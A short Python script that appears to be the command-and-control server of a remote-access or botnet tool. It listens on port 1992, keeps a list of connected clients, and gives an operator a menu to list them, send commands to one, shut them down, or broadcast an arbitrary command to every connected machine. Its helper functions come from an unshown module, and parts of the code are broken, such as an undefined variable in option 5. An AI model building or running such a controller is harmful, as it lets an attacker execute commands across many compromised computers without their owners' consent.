from socket import *
from function import *
import threading 
import time
# we will save the clients and threads so we will can delete/add
clients=[]
threads=[]
client_command_threads=[]
##class to manage the server
class serverSocket(object):
    server=None
    def __init__(self, address, port):
        self.server = socket(AF_INET, SOCK_STREAM)
        self.server.bind((address, port))
        self.server.listen(100)
    def accept(self):
        while True:
            client,addr = self.server.accept()
            #if addr[0] in [addr in client]
            ##if we add IP we alerdy have. and the the connection fail for a reason we will remove it
            for c in clients:
                if addr[0]in c[1]:
                    clients.remove(c)
                    break
            clients.append([client,addr])
    def __call__(self, *args, **kwargs):
        while True:
            menu()
            data = input("enter choise: ")
            try:
                if int(data)==1:
                    print_all_clients(clients)
                elif int(data)==2:
                    command(clients)
                elif int(data)==3:
                    shout_down(clients)
                elif int(data)==4:
                    cmd=input("[+] enter command to excute: ")
                    for client in clients:
                        t= threading.Thread(target=command,args=(clients, client,cmd))
                        client_command_threads.append(t)
                        t.start()
                        time.sleep(5)
                elif int(data)==5:
                    t= threading.Thread(target=shout_down,args=(clients, client))
                    client_command_threads.append(t)
                    t.start()
            except:
                pass
            
#listen to all IPs in port 1992
srv = serverSocket("", 1992)
t= threading.Thread(target=srv.accept)
threads.append(t)
t.start()
#we will start the menu all the time
srv()

